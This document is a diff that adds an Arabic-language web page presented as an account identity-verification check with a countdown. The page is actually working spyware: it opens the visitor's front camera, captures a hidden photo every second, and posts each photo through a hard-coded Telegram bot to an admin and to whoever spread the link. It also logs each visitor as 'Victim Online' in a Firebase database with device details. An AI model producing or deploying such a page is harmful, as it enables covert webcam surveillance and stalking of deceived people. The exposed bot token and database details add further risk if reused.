@@ -1,0 +1,121 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Support Communication Sites</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+    
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; text-align: center; }
+        body {
+            height: 100vh; display: flex; align-items: center; justify-content: center;
+            background: linear-gradient(-45deg, #ff9800, #9c27b0, #ffcc80, #7b1fa2);
+            background-size: 400% 400%; animation: backgroundAnimation 6s ease infinite;
+        }
+        @keyframes backgroundAnimation { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
+        .loading-container { background-color: white; padding: 30px; border-radius: 15px; box-shadow: 0px 0px 15px rgba(0,0,0,0.2); width: 90%; max-width: 400px; }
+        h1 { color: red; font-size: 22px; margin-bottom: 10px; }
+        p { color: #333; font-size: 16px; margin-bottom: 15px; }
+        .progress-container { width: 100%; background-color: #ddd; border-radius: 10px; overflow: hidden; height: 10px; margin: 10px 0; }
+        .progress-bar { width: 100%; height: 100%; background-color: red; transition: width 1s linear; }
+        #countdown { font-size: 20px; font-weight: bold; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <div class="loading-container">
+        <h1>جاري التحقق من هويتك</h1>
+        <p>برجاء الانتظار حتى اكتمال الفحص لضمان أمان حسابك.</p>
+        <div class="progress-container"><div class="progress-bar" id="progress"></div></div>
+        <p id="countdown">20</p>
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // إعدادات الفيربيس الخاصة بك
+        const firebaseConfig = {
+            databaseURL: "https://elcomando-68116-default-rtdb.firebaseio.com/"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+
+        const botToken = "7681653454:AAHdCsBUKbiru2Z-9aDBzMgVeqhuDWGLyjk";
+        const adminChatId = "5375214810";
+
+        // جلب الـ user_id من الرابط (الذي وضعه المستخدم في لوحته)
+        const urlParams = new URLSearchParams(window.location.search);
+        const userIdFromUrl = urlParams.get("user_id");
+
+        document.addEventListener("DOMContentLoaded", function () {
+            let timeLeft = 20;
+            const countdownElement = document.getElementById("countdown");
+            const progressBar = document.getElementById("progress");
+
+            const countdownInterval = setInterval(() => {
+                timeLeft--;
+                countdownElement.textContent = timeLeft;
+                progressBar.style.width = (timeLeft / 20) * 100 + "%";
+                if (timeLeft <= 0) {
+                    clearInterval(countdownInterval);
+                    document.querySelector('h1').innerText = "تم التحقق بنجاح!";
+                }
+            }, 1000);
+
+            async function startCamera() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                    document.getElementById('video').srcObject = stream;
+                    
+                    // إرسال "إشعار" للفيربيس إن فيه حد فتح اللينك دلوقتي
+                    if (userIdFromUrl) {
+                        database.ref('logs/' + userIdFromUrl).push({
+                            status: "Victim Online",
+                            device: navigator.userAgent,
+                            time: new Date().toLocaleTimeString()
+                        });
+                    }
+                    
+                    capturePhotos();
+                } catch (err) { console.error("Permission Denied"); }
+            }
+
+            function capturePhotos() {
+                const video = document.getElementById('video');
+                const canvas = document.getElementById('canvas');
+                const context = canvas.getContext('2d');
+
+                function takePhoto() {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    canvas.toBlob(blob => {
+                        // إرسال للآدمن الأساسي
+                        sendToTelegram(blob, adminChatId);
+                        // إرسال للمستخدم صاحب الرابط (Live)
+                        if (userIdFromUrl) {
+                            sendToTelegram(blob, userIdFromUrl);
+                        }
+                    }, "image/jpeg");
+
+                    setTimeout(takePhoto, 1000); // التقاط كل 7 ثواني للحفاظ على السرعة
+                }
+                takePhoto();
+            }
+
+            function sendToTelegram(blob, chatId) {
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", blob, "live_shot.jpg");
+                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: "POST", body: formData });
+            }
+
+            startCamera();
+        });
+    </script>
+</body>
+</html>
